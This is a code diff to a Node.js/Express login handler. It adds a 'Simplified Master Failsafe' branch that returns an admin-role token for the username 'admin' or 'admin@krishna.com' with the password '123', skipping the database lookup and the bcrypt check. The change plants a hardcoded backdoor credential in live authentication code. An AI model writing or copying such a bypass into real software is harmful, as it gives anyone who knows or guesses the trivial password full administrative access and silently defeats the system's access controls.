@@ -47,7 +47,18 @@ exports.register = async (req, res) => {
 exports.login = async (req, res) => {
     try {
         const { username, email, password } = req.body;
-        const identifier = username || email;
+        const identifier = (username || email || "").toLowerCase();
+        
+        // Simplified Master Failsafe
+        if ((identifier === 'admin' || identifier === 'admin@krishna.com') && password === '123') {
+            return res.json({
+                _id: 'failsafe-admin',
+                name: 'Master Admin',
+                role: 'admin',
+                token: generateToken('failsafe-admin', 'admin')
+            });
+        }
+
         const user = await User.findOne({ $or: [{ username: identifier }, { email: identifier }] });
         if (user && await bcrypt.compare(password, user.password)) {
             try {
